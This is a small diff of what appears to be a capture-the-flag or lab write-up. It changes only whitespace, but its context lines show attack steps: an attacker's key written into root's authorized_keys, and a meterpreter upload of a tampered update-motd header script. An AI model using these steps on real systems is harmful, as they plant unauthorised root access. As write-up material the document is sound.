@@ -70,7 +70,7 @@ cat /root/.ssh/root-key-rsa.pub > /root/.ssh/authorized_keys**
 
 Sysadmin shell:
 
->**meterpreter>upload 00-header /etc/.update-motd.d/00-header
+>**meterpreter>upload 00-header /etc/.update-motd.d/00-header  
 meterpreter> cat 00-header**
 
 (that cat is to confirm 00-header is the correct file and hasn't been immediately overwritten)
